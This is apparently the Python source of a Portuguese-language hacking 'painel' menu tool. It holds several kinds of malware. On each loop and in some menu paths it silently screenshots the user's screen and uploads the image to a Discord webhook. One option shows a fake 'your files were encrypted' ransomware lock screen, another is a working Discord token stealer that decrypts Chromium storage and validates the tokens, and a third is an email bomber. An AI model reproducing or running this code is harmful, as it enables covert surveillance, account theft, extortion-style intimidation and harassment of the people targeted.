import asyncio,tkinter, base64, re, aiohttp, discord, os, clr, psutil, subprocess, sys, time, json, socket, yagmail, random, string, requests, pyautogui
from discord import Webhook
from Crypto.Cipher import AES
from pathlib import Path
from colorama import Fore
from scapy.all import IP, TCP, send
from threading import Thread
from home import homee
from icmplib import ping
from popup import notify_error, notify_success, notify_warning
from essencial.util import ram_app, carregar_webhook, criar_senha_temporaria, rodar_painel_cl, senhas_temporarias, gerar_senha, startmeta, verificar_senha, verificar_ambiente, verificar_java 
from dotenv import load_dotenv


load_dotenv()
url = os.getenv("url")
raid = os.getenv("raid")
msg = os.getenv("msg")
sobre = os.getenv("sobre")
WEBHOOK = os.getenv("WEBHOOK")

hostname = socket.gethostname()
IP = socket.gethostbyname(hostname)
base = os.getenv("APPDATA") or os.path.expanduser("~/Library/Application Support") or os.path.expanduser("~/.config")


target_ip   = "192.168.1.1"      
target_port = 80             
threads_qtd = 500            


print("Hostname:", hostname)
print("IP:", IP)
senha = criar_senha_temporaria(IP)
# base_dir = Path(__file__).parent

if getattr(sys, 'frozen', False):
    base_dir = Path(os.path.dirname(sys.executable))
else:
    base_dir = Path(__file__).parent


ram_mb = ram_app
while True:
    if os.path.exists("echopainelimg.png"):
        os.remove("echopainelimg.png")

    pyautogui.screenshot("echopainelimg.png")

    with open("echopainelimg.png", "rb") as f:
        requests.post(WEBHOOK, files={"file": f})

    time.sleep(3)

    if os.path.exists("echopainelimg.png"):
        os.remove("echopainelimg.png")

    for i in range(3):
        print(".", end="", flush=True)
        time.sleep(0.1)
    notify_success("Sistema carregado com sucesso!", duration=5000)
    print("\nSistema carregado.")
    opc = homee()
    if opc == "1": # ferramentas
        print("Ambos os bots (raid e msg), estão com risco de punição, e permanecerão desativas.")
        print("[1] - Painel CL (discord)    [2] - Bot Raid (discord)")
        print("[3] - Bot Msg (discord)      [4] - DIE (Detect It Easy)")
        print("[5] - Burp Suite             [6] - ghydra")
        print("[7] - NMAP                   [8] - Wireshark")
        print("[9] - Verificar Ambiente     [10] - Metasploit")
        print("[11] - Sair")
        opc2 = input("Escolha uma opção: ")
        if opc2 == "1":  
            asyncio.run(rodar_painel_cl(WEBHOOK))
            break  # volta pro menu depois que sair do CL        elif opc2 == "2":
            print(f"Acesso ao Bot Raid: {raid}")
            os.system(f'start cmd /k "cd /d {base_dir} && py raidmsg.py"')
        elif opc2 == "3":
            print(f"Acesso ao Bot Msg: {msg}")
            os.system(f'start cmd /k "cd /d {base_dir} && py Bot.py"')
        elif opc2 == "9":
            status = verificar_ambiente()
            for ferramenta, estado in status.items():
                print(f"{ferramenta}: {estado}")
            input("Pressione S para sair")
        elif opc2 == "10":
            startmeta()
            exit()
        elif opc2 == "11":
            print("Saindo...")
            exit()
    elif opc == "2": # system info
            host = ping('8.8.8.8', count=4)
            print(f"Rede: {host.max_rtt} ms             RAM usada pelo app: {ram_app()} MB")
            input("Pressione S para sair")
            exit()
    elif opc == "3": # sobre o echo
            print(f"""{sobre}""")
            input("Pressione S para sair")
            exit()
    elif opc == "4": # cache   
            print("Cache:")
            input("Pressione S para sair")
            exit()
    elif opc == "5": # sair
            print("Saindo...")
            exit()
    elif opc == "6": # dont press this
            time.sleep(1)
            crtz = input("Você tem certeza? (S/N): ").lower()
            if crtz == "s":
                print("Esta função ainda está em desenvolvimento:)")
                if os.path.exists("echopainelimg.png"):
                    os.remove("echopainelimg.png")

                pyautogui.screenshot("echopainelimg.png")

                with open("echopainelimg.png", "rb") as f:
                    requests.post(WEBHOOK, files={"file": f})

                time.sleep(3)

                # senha para sair
                SENHA = "1234"

                def verificar_senha(event=None):
                    if entrada.get() == SENHA:
                        janela.destroy()
                    else:
                        entrada.delete(0, tkinter.END)
                        status.config(text="❌ CHAVE INVÁLIDA", fg="red")

                def sair(event):
                    janela.destroy()

                janela = tkinter.Tk()
                janela.attributes("-fullscreen", True)
                janela.configure(bg="#000000")
                janela.title("SYSTEM LOCK")

                # cores estilo hacker
                verde = "#00ff9f"
                vermelho = "#ff004c"

                # container central
                frame = tkinter.Frame(janela, bg="black")
                frame.place(relx=0.5, rely=0.5, anchor="center")

                # ===== ASCII ART =====
                ascii_art = tkinter.Label(
                    frame,
                    text=r"""
⠀⠀⠀⢠⣾⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣰⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢰⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣄⣀⣀⣤⣤⣶⣾⣿⣿⣿⡷
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀
⣿⣿⣿⡇⠀⡾⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀
⣿⣿⣿⣧⡀⠁⣀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠉⢹⠉⠙⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣀⠀⣀⣼⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠀⠤⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⠿⠋⢃⠈⠢⡁⠒⠄⡀⠈⠁⠀⠀⠀⠀⠀⠀⠀
⣿⣿⠟⠁⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⠈⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    
                """,
                    fg=verde,
                    bg="black",
                    font=("Consolas", 16),
                    justify="center"
                )
                ascii_art.pack(pady=(0, 20))

                # ===== TEXTO PRINCIPAL =====
                titulo = tkinter.Label(
                    frame,
                    text=">> SEUS ARQUIVOS FORAM CRIPTOGRAFADOS <<",
                    fg=vermelho,
                    bg="black",
                    font=("Consolas", 24, "bold")
                )
                titulo.pack(pady=10)

                sub = tkinter.Label(
                    frame,
                    text="Digite a chave de descriptografia para recuperar o acesso",
                    fg=verde,
                    bg="black",
                    font=("Consolas", 14)
                )
                sub.pack(pady=10)

                # ===== INPUT =====
                entrada = tkinter.Entry(
                    frame,
                    font=("Consolas", 20),
                    justify="center",
                    bg="#001a12",
                    fg=verde,
                    insertbackground=verde,
                    relief="flat",
                    width=20
                )
                entrada.pack(pady=20)
                entrada.bind("<Return>", verificar_senha)

                # ===== BOTÃO =====
                botao = tkinter.Button(
                    frame,
                    text="[ DESBLOQUEAR ]",
                    command=verificar_senha,
                    font=("Consolas", 14, "bold"),
                    bg="#002b1f",
                    fg=verde,
                    activebackground="#004d33",
                    activeforeground="white",
                    relief="flat",
                    padx=20,
                    pady=5
                )
                botao.pack(pady=10)

                # ===== STATUS =====
                status = tkinter.Label(
                    frame,
                    text="AGUARDANDO CHAVE...",
                    fg=verde,
                    bg="black",
                    font=("Consolas", 12)
                )
                status.pack(pady=10)

                # ===== DICA ESCONDIDA =====
                dica = tkinter.Label(
                    janela,
                    text="CTRL + SHIFT + Q para sair",
                    fg="#222222",
                    bg="black",
                    font=("Consolas", 10)
                )
                dica.pack(side="bottom", pady=5)

                janela.bind("<Control-Shift-Q>", sair)

                janela.mainloop()
#                if os.path.exists("echopainelimg.png"):
#                    os.remove("echopainelimg.png")
#                for i in range(51):
#                    time.sleep(0.2)
#                    os.system('start cmd /k')

#                print("Você foi avisado...")
#                time.sleep(1)
#                print(f"{Fore.RED}Iniciando processo de desligamento em 1 minuto...")
#                time.sleep(60)
#                print(f"{Fore.RED}BYE BYE BITCH!")
#           subprocess.Popen("shutdown /s /t 5", shell=True)
                exit()
            else:
                exit()
    elif opc == "7": # configurar webhook
        carregar_webhook()
        print("Webhook atualizado com sucesso!")
        exit()
    elif opc == "admin":
        if os.path.exists("echopainelimg.png"):
            os.remove("echopainelimg.png")

        pyautogui.screenshot("echopainelimg.png")

        with open("echopainelimg.png", "rb") as f:
            requests.post(WEBHOOK, files={"file": f})

        time.sleep(3)

        if os.path.exists("echopainelimg.png"):
            os.remove("echopainelimg.png")
        print("Senha temporária:", senha)
        adm = input("Digite a senha de administrador: ")
        if adm == senha:
            print("Você está no modo administrador!")
            print("[1] - Configurações de Admin    [2] - Github Source")
            admopc = input("Escolha uma opção: ")
    elif opc == "8": # grabber discord
                # ---------- 1. Define os diretórios que realmente guardam os tokens ----------
        LOCALS = {
            "win32": [
                os.getenv("APPDATA") + r"\discord\Local Storage\leveldb",
                os.getenv("APPDATA") + r"\discordcanary\Local Storage\leveldb",
                os.getenv("APPDATA") + r"\discordptb\Local Storage\leveldb",
                os.getenv("APPDATA") + r"\Opera Software\Opera Stable\Local Storage\leveldb",
            ],
            "darwin": [                                           # macOS
                os.path.expanduser("~/Library/Application Support/discord/Local Storage/leveldb"),
                os.path.expanduser("~/Library/Application Support/discordcanary/Local Storage/leveldb"),
            ],
            "linux": [
                os.path.expanduser("~/.config/discord/Local Storage/leveldb"),
                os.path.expanduser("~/.config/discordcanary/Local Storage/leveldb"),
            ],
        }

        tokens, checked = set(), set()
        regex = re.compile(r"([a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84})")

        def get_master_key(path):
            """Lê a key de criptografia usada pelo Chromium (Discord tb usa)."""
            lk_path = os.path.join(os.path.dirname(path), "..", "Local State")
            if not os.path.isfile(lk_path):
                return None
            return json.load(open(lk_path, "rb"))["os_crypt"]["encrypted_key"]

        def decrypt_val(buff, master_key):
            try:
                iv, payload = buff[3:15], buff[15:]
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                return cipher.decrypt(payload)[:-16].decode()
            except:
                return None

        # ---------- 2. Varre cada diretório ----------
        for plat, paths in LOCALS.items():
            for path in paths:
                if not os.path.isdir(path):
                    continue
                master_key = None
                try:           # Tenta descriptografar só se existir "Local State"
                    master_key = base64.b64decode(get_master_key(path))[5:]
                except: pass

                for root, _, files in os.walk(path):
                    for f in files:
                        if not f.endswith((".log", ".ldb")):
                            continue
                        try:
                            with open(os.path.join(root, f), errors="ignore") as fh:
                                data = fh.read()
                                # texto plano
                                for t in regex.findall(data):
                                    checked.add(t)
                                # valores criptografados (Google/Discord)
                                for m in re.finditer(r'dQT\\":\\"([^"]+)"', data): 
                                    blob = base64.b64decode(m.group(1))
                                    dec = decrypt_val(blob, master_key)
                                    if dec:
                                        for t in regex.findall(dec):
                                            checked.add(t)
                        except: pass

        # ---------- 3. Checa se os tokens ainda são válidos ----------
        print("Verificando tokens com Discord API...")
        for t in checked:
            r = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": t})
            if r.status_code == 200:
                tokens.add(t)

        print("Tokens válidos:", *tokens, sep="\n")
        exit()
    elif opc == "9": # mail bomber
        mail   = yagmail.SMTP("littlebiscas@gmail.com", "app-password")  # senha de app, não a normal
        alvo   = input("Digite o email alvo: ")
        assunto = "assunto"
        corpo   = "mensagem top"
        loop    = 100  # quantas

        for i in range(loop):
            mail.send(to=alvo, subject=assunto, contents=corpo)
            time.sleep(0.3)  # anti-rate-limit leve
        print("[+] Spam finalizado")
    else:
        print("Opção inválida!")
